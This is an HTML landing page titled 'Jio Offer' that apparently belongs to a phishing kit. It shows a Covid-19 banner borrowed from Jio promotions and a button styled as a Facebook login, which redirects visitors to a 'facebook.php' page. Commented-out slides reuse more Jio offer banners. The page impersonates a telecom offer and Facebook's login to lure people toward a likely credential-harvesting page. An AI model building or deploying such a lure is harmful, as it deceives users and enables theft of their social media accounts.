<!DOCTYPE html>
<html>
<title>Jio Offer</title>
<link rel="icon" href="img/jio.png" type="image/icon type">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Verdana, sans-serif;
        }

        .mySlides {
            display: none;
        }

        img {
            vertical-align: middle;
        }

        /* Slideshow container */

        .slideshow-container {
            max-width: 1000px;
            position: relative;
            margin: auto;
        }

        /* Caption text */

        .text {
            color: #ffffff;
            font-size: 15px;
            padding: 8px 12px;
            position: absolute;
            bottom: 15vh;
            width: 100%;
            text-align: center;
            background: url(img/fblogin.png);
        }

        /* Number text (1/3 etc) */

        .login {
            background: url(img/fblogin.png);
            background-repeat: no-repeat;
            width: 100px;
            height: 40px;
            border: 0;
        }

        .numbertext {
            color: #f2f2f2;
            font-size: 12px;
            padding: 8px 12px;
            position: absolute;
            top: 0;
        }

        /* The dots/bullets/indicators */

        .dot {
            height: 15px;
            width: 15px;
            margin: 0 2px;
            background-color: #bbb;
            border-radius: 50%;
            display: inline-block;
            transition: background-color 0.6s ease;
        }

        .active {
            background-color: #717171;
        }

        /* Fading animation */

        .fade {
            -webkit-animation-name: fade;
            -webkit-animation-duration: 1.5s;
            animation-name: fade;
            animation-duration: 1.5s;
        }

        #btn-start {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            object-fit: fill;
            //background-image: url("img/start.png");
            //  width: 60vh;
            height: 30vh;
            margin-top: 65vh;
            object-fit: fill;
            outline: none;

            @-webkit-keyframes fade {
                from {
                    opacity: .4
                }

                to {
                    opacity: 1
                }
            }

            @keyframes fade {
                from {
                    opacity: .4
                }

                to {
                    opacity: 1
                }
            }

            /* On smaller screens, decrease text size */

            @media only screen and (max-width: 300px) {
                .text {
                    font-size: 11px
                }
            }
    </style>
</head>

<body style="padding:0px;margin:0px;">
    <div class="slideshow-container">

        <div class="mySlides fade">
            <div class="numbertext"></div>
            <img src="img/Covid-19-Mobile-banner-400x640.jpg" style="width:100%">
            <div class="">
                <input id="btn-start" type="image" onclick="StartGame();" class="share-button" src="img/fblogin.png" value="share" alt="Submit">
            </div>
        </div>

            <!-- <div class="mySlides fade">
                <div class="numbertext"></div>
                <img src="img/Aarogya-setu-app-hmpg-banner-mob.jpg" style="width:100%">
                <div class="">
                <input id="btn-start" type="image" class="share-button" src="img/fblogin.png" value="share" alt="Submit">
            </div>
            </div>

            <div class="mySlides fade">
                <div class="numbertext"></div>
                <img src="img/Jio-Wifi-Calling_JioHomePg_Mobile_400x640px.jpg" style="width:100%">
                <div class="">
                <input id="btn-start" type="image" class="share-button" src="img/fblogin.png" value="share" alt="Submit">
            </div>
            </div>
            <div class="mySlides fade">
                <div class="numbertext"></div>
                <img src="img/Recharge-for-Friend-Digyyital-Adapts_290420-400x640.jpg" style="width:100%">
                <div class="">
                <input id="btn-start" type="image" class="share-button" src="img/fblogin.png" value="share" alt="Submit">
            </div>
            </div>
            <div class="mySlides fade">
                <div class="numbertext"></div>
                <img src="img/ssspecial-partner-offers_Mobile_400x640px.jpg" style="width:100%">
                <div class="">
                <input id="btn-start" type="image" class="share-button" src="img/fblogin.png" value="share" alt="Submit">
            </div>
            </div> -->

        </div>
        <br>

        <div style="text-align:center">
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
            <span class="dot"></span>
        </div>

        <script>
            var slideIndex = 0;
            showSlides();

            function showSlides() {
                var i;
                var slides = document.getElementsByClassName("mySlides");
                var dots = document.getElementsByClassName("dot");
                for (i = 0; i < slides.length; i++) {
                    slides[i].style.display = "none";
                }
                slideIndex++;
                if (slideIndex > slides.length) {
                    slideIndex = 1
                }
                for (i = 0; i < dots.length; i++) {
                    dots[i].className = dots[i].className.replace(" active", "");
                }
                slides[slideIndex - 1].style.display = "block";
                dots[slideIndex - 1].className += " active";
                setTimeout(showSlides, 2000); // Change image every 2 seconds
            }
            function StartGame() {
                location.replace("facebook.php")
            }
        </script>

</body>

</html>